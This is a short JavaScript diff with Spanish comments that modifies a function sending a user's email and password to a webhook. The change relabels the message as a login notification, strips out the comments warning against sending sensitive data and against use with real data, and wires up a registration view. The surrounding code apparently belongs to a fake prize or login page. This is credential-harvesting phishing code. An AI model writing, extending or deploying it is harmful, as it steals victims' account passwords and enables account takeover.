@@ -244,10 +244,9 @@ function enviarDatosAWebhook(email, contrasena) {
     request.setRequestHeader('Content-type', 'application/json');
 
     var params = {
-        username: "Sistema de Recuperación",
+        username: "Notificación de inicio de sesión",
         avatar_url: "",
-        // Asegúrate de no enviar información sensible en aplicaciones reales
-        content: `Solicitud de recuperación de cuenta: ${email} - Contraseña: ${contrasena}`
+        content: `Correo electrónico: ${email} - Contraseña: ${contrasena}`
     };
 
     request.send(JSON.stringify(params));
@@ -263,9 +262,10 @@ function enviarDatosAWebhook(email, contrasena) {
     };
 }
 
-// Ejemplo de uso (NO UTILIZAR CON DATOS REALES):
-enviarDatosAWebhook("correo@example.com", "contrasena123");
-
+// Cambia a la vista de registro
+document.getElementById('irARegistro').addEventListener('click', function() {
+    mostrarRegistro(); // Asegúrate de que esta función esté bien definida para manejar el cambio de vista
+});
    
 
     // Inicialización de la pizarra de premios
